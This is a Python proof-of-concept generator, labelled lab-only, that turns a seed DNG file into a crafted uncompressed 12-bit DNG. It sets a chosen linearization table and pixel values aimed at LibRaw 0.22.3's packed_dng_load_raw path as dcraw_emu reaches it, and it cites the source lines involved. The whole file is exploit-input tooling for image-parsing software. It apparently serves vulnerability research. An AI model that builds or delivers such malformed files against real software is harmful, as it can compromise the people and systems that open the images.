#!/usr/bin/env python3
"""Lab-only W13: uncompressed 12-bit DNG with a per-sample LinearizationTable.

The pinned PoC uses compression=7 (lossless JPEG), whose all-zero scan decodes
to one uniform raw value. LibRaw 0.22.3's packed_dng_load_raw() handles
compression=1 with 12-bit samples and feeds each sample through curve[] via
adobe_copy_pixel() (src/decoders/dng.cpp:34-51,140-180). That gives direct
per-pixel control of the raw field, still through the real dcraw_emu consumer.

usage: craft_uncompressed_poc.py SRC DST SPEC.json
SPEC keys:
  base_raw      raw sample used for every pixel (default 2048)
  curve_default value of curve[base_raw] (default 0xbeef)
  curve         {"<raw sample>": value} overrides (0..4095)
  pixels        [[row, col, raw_sample], ...] overrides after packing
  whitelevel    DNG WhiteLevel written to tag 0xc61d (default 65535)
"""
import json
import struct
import sys

src, dst, specfile = sys.argv[1:4]
spec = json.load(open(specfile))
num = lambda x: int(x, 0) if isinstance(x, str) else int(x)
base_raw = num(spec.get("base_raw", 2048))
curve_default = num(spec.get("curve_default", 0xbeef))
curve_over = {num(k): num(v) for k, v in spec.get("curve", {}).items()}
whitelevel = num(spec.get("whitelevel", 65535))
assert 0 <= base_raw <= 4095
assert 0 <= curve_default <= 65535
assert all(0 <= k <= 4095 and 0 <= v <= 65535 for k, v in curve_over.items())
assert 0 <= whitelevel <= 2**32 - 1

d = bytearray(open(src, "rb").read())
ifd = struct.unpack_from("<I", d, 4)[0]
n = struct.unpack_from("<H", d, ifd)[0]
tags = {}
for i in range(n):
    e = ifd + 2 + 12 * i
    tag = struct.unpack_from("<H", d, e)[0]
    tags[tag] = e

# Compression 7 -> 1 (uncompressed); strip geometry stays 512x512x12bpp.
e = tags[0x0103]
assert struct.unpack_from("<H", d, e + 8)[0] == 7
struct.pack_into("<H", d, e + 8, 1)

# WhiteLevel: keep the W11 setting to avoid scale/saturation surprises.
e = tags[0xC61D]
assert struct.unpack_from("<I", d, e + 8)[0] == 65535
struct.pack_into("<I", d, e + 8, whitelevel)

# Linearization table goes after the original bytes, aligned to 2 bytes.
lin_n = max([4096] + [k + 1 for k in curve_over])
lin_off = len(d) + (len(d) & 1)
if len(d) & 1:
    d.append(0)
e = tags.get(0xC618, tags.get(0x00FE))
assert e is not None
struct.pack_into("<HHI", d, e, 0xC618, 3, lin_n)
struct.pack_into("<I", d, e + 8, lin_off)

table = [curve_default] * lin_n
for k, v in curve_over.items():
    table[k] = v
d += struct.pack("<%dH" % lin_n, *table)

# Packed 12-bit big-endian row data (getbits(-1); getbits(12) per sample).
raw_off = len(d)
pixels = [base_raw] * (512 * 512)
for row, col, value in spec.get("pixels", []):
    assert 0 <= row < 512 and 0 <= col < 512 and 0 <= value <= 4095
    pixels[row * 512 + col] = value
if "colors" in spec:
    pattern = [b & 3 for b in d[262144:262180]]
    assert len(pattern) == 36
    cmap = {int(k): num(v) for k, v in spec["colors"].items()}
    for row in range(512):
        for col in range(512):
            c = pattern[row % 6 * 6 + col % 6]
            if c in cmap:
                pixels[row * 512 + col] = cmap[c]
packed = bytearray()
acc = 0
nbits = 0
for v in pixels:
    acc = (acc << 12) | v
    nbits += 12
    while nbits >= 8:
        nbits -= 8
        packed.append((acc >> nbits) & 0xFF)
    acc &= (1 << nbits) - 1
if nbits:
    packed.append((acc << (8 - nbits)) & 0xFF)
assert len(packed) == 512 * 512 * 12 // 8
d += packed

e = tags[0x0111]
struct.pack_into("<I", d, e + 8, raw_off)
e = tags[0x0117]
struct.pack_into("<I", d, e + 8, len(packed))

open(dst, "wb").write(d)
print(f"wrote {dst} len={len(d)} lin_off={lin_off} raw_off={raw_off} "
      f"pixels={len(pixels)} changed={len(spec.get('pixels', []))}")
